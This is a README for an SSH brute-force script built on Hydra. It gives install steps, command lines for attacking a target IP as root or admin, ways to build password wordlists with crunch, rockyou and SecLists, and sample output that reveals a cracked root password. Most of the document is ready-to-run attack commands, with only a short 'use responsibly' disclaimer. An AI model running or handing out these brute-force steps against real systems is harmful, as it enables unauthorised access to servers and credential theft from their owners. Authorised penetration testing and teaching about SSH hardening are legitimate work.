# SSH Brute Force Tester 🔓

Quick SSH brute force script using Hydra. Auto-detects if target supports password auth before attacking.

## Install

```bash
# Install hydra
sudo apt install hydra -y

# Clone repo
git clone https://github.com/keinankairi-afk/ssh-brute.git
cd ssh-brute

# Make executable
chmod +x ssh-brute.sh
```

## Usage

```bash
./ssh-brute.sh <ip> <user> [wordlist]
```

### Examples

```bash
# Basic - use built-in wordlist
./ssh-brute.sh 123.123.1.1 root

# Custom user
./ssh-brute.sh 123.123.1.1 admin

# Custom wordlist
./ssh-brute.sh 123.123.1.1 root /usr/share/wordlists/rockyou.txt

# Generate bigger wordlist
crunch 6 8 abcdefghijklmnopqrstuvwxyz1234567890 -o /tmp/bigwordlist.txt
./ssh-brute.sh 123.123.1.1 root /tmp/bigwordlist.txt
```

## What it does

1. **Check** — tests if target supports password authentication
2. **Wordlist** — uses built-in or custom wordlist
3. **Attack** — runs hydra with 4 threads
4. **Report** — shows found credentials

## Output

```
=== SSH Brute Force Tester ===
Target: 123.123.1.1
User:   root

[1/3] Checking password auth...
[+] Password auth supported!
[2/3] Using wordlist: /tmp/sshpw.txt
[3/3] Starting brute force (62 passwords)...

[FOUND] host: 123.123.1.1   login: root   password: toor
```

## Custom Wordlists

| Wordlist | Source |
|----------|--------|
| rockyou.txt | `sudo apt install wordlists` → `/usr/share/wordlists/rockyou.txt` |
| crunch | `crunch 6 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt` |
| SecLists | `git clone https://github.com/danielmiessler/SecLists.git` |

## Notes

- Only works on targets with **password authentication enabled**
- Script auto-detects if target only accepts SSH keys (skips)
- Use responsibly — only test systems you own or have permission to test
- For educational/CTF purposes only

## License

MIT — use responsibly
